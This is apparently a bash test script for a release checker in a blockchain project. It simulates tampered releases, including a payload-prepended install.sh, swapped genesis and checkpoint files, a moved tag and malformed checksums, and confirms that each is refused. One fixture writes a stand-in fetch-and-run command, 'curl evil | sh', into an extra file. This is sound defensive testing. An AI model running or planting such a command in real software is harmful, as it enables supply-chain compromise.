#!/usr/bin/env bash
# Tests scripts/check-release-files.sh, the signer's check of a release's non-archive files against
# the reviewed commit (audit F49 round 3, review-r2-supply-4), offline: a local repository with a
# tag, a release made from it as release.yml makes one (scripts/release-checksums.sh), then each
# way a compromised release workflow or a moved tag could get a file signed that the signer never
# checked.
#   bash scripts/test-release-files.sh
set -euo pipefail
cd "$(dirname "$0")/.."
ROOT=$PWD
CHECK=$ROOT/scripts/check-release-files.sh
T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT
pass=0
fail() { echo "✗ $*" >&2; exit 1; }
ok() { pass=$((pass + 1)); echo "✓ $1"; }
g() { git -C "$T/repo" -c user.email=t@example.org -c user.name=t -c commit.gpgsign=false -c tag.gpgsign=false "$@"; }

# The tagged source: install.sh, a genesis file and a checkpoint file, as the repository has them.
mkdir -p "$T/repo/scripts" "$T/repo/genesis/blockula-1" "$T/repo/node/checkpoints"
git init -q "$T/repo"
cp scripts/install.sh "$T/repo/scripts/install.sh"
echo '{"chain_id":"blockula-1"}' > "$T/repo/genesis/blockula-1/genesis.json"
echo '{"chain_id":"blockula-1","checkpoints":[]}' > "$T/repo/node/checkpoints/blockula-1.json"
g add -A && g commit -qm release && g tag v9.9.9
COMMIT=$(g rev-parse HEAD)

# release DIR: what release.yml's attest job publishes for that tag.
release() {
  local dir=$1 t
  rm -rf "$dir" && mkdir -p "$dir"
  for t in aarch64-apple-darwin x86_64-apple-darwin x86_64-unknown-linux-gnu aarch64-unknown-linux-gnu; do
    printf 'archive %s\n' "$t" > "$dir/blockula-$t.tar.gz"
  done
  cp "$T/repo/scripts/install.sh" "$dir/install.sh"
  cp "$T/repo/genesis/blockula-1/genesis.json" "$dir/genesis-blockula-1.json"
  cp "$T/repo/node/checkpoints/blockula-1.json" "$dir/checkpoints-blockula-1.json"
}
sums() { rm -f "$1/checksums.txt"; scripts/release-checksums.sh "${2:-v9.9.9}" "$1" > /dev/null; }
check() { SRC=$T/repo COMMIT=${C:-$COMMIT} "$CHECK" v9.9.9 "$1/checksums.txt" 2>&1; }
# refused NAME EXPECTED DIR: the check must fail, saying EXPECTED.
refused() {
  local out
  if out=$(check "$3"); then fail "$1: the check accepts it: $out"; fi
  printf '%s' "$out" | grep -qF -- "$2" || fail "$1: expected \"$2\" in: $out"
  ok "$1: refused"
}

release "$T/genuine" && sums "$T/genuine"
out=$(check "$T/genuine") || fail "the genuine release is refused: $out"
printf '%s' "$out" | grep -qF "install.sh is v9.9.9's scripts/install.sh" || fail "install.sh wasn't compared: $out"
ok "the genuine release: install.sh, genesis and checkpoints match the tag, every archive listed"

# The reviewer's case: genuine archives (they reproduce), an install.sh with a payload, checksums
# written over it by the workflow. Provenance would pass; this check is what stops the signature.
release "$T/payload" && { echo 'echo ATTACKER CODE RAN' | cat - "$T/payload/install.sh" > "$T/x" && mv "$T/x" "$T/payload/install.sh"; } && sums "$T/payload"
refused "an install.sh with a payload, under the workflow's checksums" "install.sh doesn't match v9.9.9's scripts/install.sh" "$T/payload"
release "$T/genesis" && echo '{"chain_id":"blockula-1","evil":1}' > "$T/genesis/genesis-blockula-1.json" && sums "$T/genesis"
refused "a swapped genesis file" "genesis-blockula-1.json doesn't match v9.9.9's genesis/blockula-1/genesis.json" "$T/genesis"
release "$T/ckpt" && echo '{"chain_id":"blockula-1","checkpoints":["1:evil"]}' > "$T/ckpt/checkpoints-blockula-1.json" && sums "$T/ckpt"
refused "a swapped checkpoint file" "checkpoints-blockula-1.json doesn't match v9.9.9's node/checkpoints/blockula-1.json" "$T/ckpt"
release "$T/extra" && echo 'curl evil | sh' > "$T/extra/upgrade.sh" && sums "$T/extra"
refused "an extra file nobody checks" "upgrade.sh isn't a file a release carries" "$T/extra"
release "$T/genesis2" && echo '{}' > "$T/genesis2/genesis-blockula-2.json" && sums "$T/genesis2"
refused "a genesis file the tag doesn't have" "v9.9.9 has no genesis/blockula-2/genesis.json" "$T/genesis2"
release "$T/noinstall" && rm "$T/noinstall/install.sh" && sums "$T/noinstall"
refused "install.sh missing" "install.sh isn't listed" "$T/noinstall"
release "$T/nockpt" && rm "$T/nockpt/checkpoints-blockula-1.json" && sums "$T/nockpt"
refused "a checkpoint file left out" "v9.9.9 has node/checkpoints/blockula-1.json, but checkpoints-blockula-1.json isn't listed" "$T/nockpt"
release "$T/noarch" && rm "$T/noarch/blockula-aarch64-apple-darwin.tar.gz" && sums "$T/noarch"
refused "an archive missing" "blockula-aarch64-apple-darwin.tar.gz isn't listed" "$T/noarch"
release "$T/oddarch" && echo x > "$T/oddarch/blockula-riscv64gc-unknown-linux-gnu.tar.gz" && sums "$T/oddarch"
refused "an archive for no release target" "isn't a release target's archive" "$T/oddarch"
release "$T/dup" && sums "$T/dup" && tail -n 1 "$T/dup/checksums.txt" >> "$T/dup/checksums.txt"
refused "a line listed twice" "is listed twice" "$T/dup"
release "$T/odd" && sums "$T/odd" && printf 'not a checksum line\n' >> "$T/odd/checksums.txt"
refused "a malformed line" "isn't '<sha256>  <file>'" "$T/odd"
release "$T/tagline" && sums "$T/tagline" v9.9.8
refused "another release's tag line" "not '# blockula-release v9.9.9'" "$T/tagline"

# The builders' rebuilt hashes (REPRODUCED): the draft the signer got must list exactly those.
for t in x86_64-unknown-linux-gnu aarch64-unknown-linux-gnu; do grep " blockula-$t.tar.gz\$" "$T/genuine/checksums.txt"; done > "$T/rebuilt.txt"
out=$(REPRODUCED=$T/rebuilt.txt check "$T/genuine") || fail "the genuine release with the builders' hashes is refused: $out"
printf '%s' "$out" | grep -qF "blockula-x86_64-unknown-linux-gnu.tar.gz is the archive the builders rebuilt" || fail "REPRODUCED wasn't compared: $out"
ok "REPRODUCED: the Linux archives are the ones the builders rebuilt"
release "$T/swapped" && printf 'evil archive\n' > "$T/swapped/blockula-aarch64-unknown-linux-gnu.tar.gz" && sums "$T/swapped"
REPRODUCED=$T/rebuilt.txt refused "a Linux archive the builders didn't rebuild (the draft changed after they checked it)" "blockula-aarch64-unknown-linux-gnu.tar.gz is listed as" "$T/swapped"
grep -v aarch64 "$T/rebuilt.txt" > "$T/rebuilt-one.txt"
REPRODUCED=$T/rebuilt-one.txt refused "only one Linux archive reproduced" "blockula-aarch64-unknown-linux-gnu.tar.gz: no rebuilt hash for it" "$T/genuine"
{ cat "$T/rebuilt.txt"; echo "$(printf 'f%.0s' $(seq 64))  blockula-x86_64-unknown-linux-gnu.tar.gz"; } > "$T/rebuilt-split.txt"
REPRODUCED=$T/rebuilt-split.txt refused "builders who disagree" "the builders' hashes in" "$T/genuine"
out=$(check "$T/genuine" 2>&1) && printf '%s' "$out" | grep -qF "weren't compared with the builders' rebuilt hashes" || fail "without REPRODUCED the check doesn't warn: $out"
ok "without REPRODUCED: says the archives weren't compared"

# The tag moved to a commit that changes only install.sh: everything matches its own source, so
# only the commit the signer reviewed catches it.
reviewed=$COMMIT
sed 's/^set -eu$/set -eu; echo MOVED TAG RAN/' scripts/install.sh > "$T/repo/scripts/install.sh"
g commit -qam moved && g tag -f v9.9.9 > /dev/null
release "$T/moved" && sums "$T/moved"
C=$reviewed refused "the tag moved to another commit (its own files match it)" "points at $(g rev-parse HEAD), not the commit you reviewed" "$T/moved"
if out=$(SRC=$T/repo "$CHECK" v9.9.9 "$T/moved/checksums.txt" 2>&1); then fail "no COMMIT: accepted: $out"; fi
printf '%s' "$out" | grep -qF "set COMMIT" || fail "no COMMIT: refused for another reason: $out"
ok "no reviewed commit given: refused"
echo "✓ release files: $pass cases"
